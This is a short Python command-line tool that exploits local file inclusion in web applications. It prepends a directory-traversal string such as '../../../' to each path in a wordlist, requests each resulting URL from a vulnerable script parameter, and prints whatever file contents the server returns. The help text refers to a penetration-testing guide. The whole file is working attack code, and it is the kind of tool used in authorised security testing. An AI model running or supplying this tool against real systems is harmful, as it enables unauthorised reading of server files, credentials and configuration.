import requests
import argparse

# Set up command-line argument parsing with updated help text
parser = argparse.ArgumentParser(
    description="""Fetch and display content from URL having LFI. 
		for more information visit: https://book.hacktricks.xyz/pentesting-web/file-inclusion"""
)
parser.add_argument('-u', '--url', type=str, required=True, help="Base URL (e.g., 'http://dev.site/script.php?page=')")
parser.add_argument('-f', '--file', type=str, required=True, help="File containing paths to be appended to the base URL")
parser.add_argument('--traversal', type=str, default='', help="Directory traversal string to prepend to paths (e.g., '../../../')")

# Parse the arguments
args = parser.parse_args()

# Open the file and read each line
with open(args.file, 'r') as f:
    for line in f:
        # Strip any leading/trailing whitespace from the line
        path = line.strip()

        # Construct the full URL with traversal if provided
        if args.traversal:
            # Apply traversal to the path
            path = f"{args.traversal}{path}"

        # Construct the final URL
        url = f"{args.url}{path}"

        try:
            # Make the HTTP GET request
            response = requests.get(url)

            # Check if the response contains any valid content (non-empty)
            if response.text.strip():
                print(f"Output for {path}:")
                print(response.text)
                print("\n" + "="*50 + "\n")
        except requests.exceptions.RequestException as e:
            # Handle any errors (e.g., connection issues)
            print(f"Error requesting {url}: {e}")
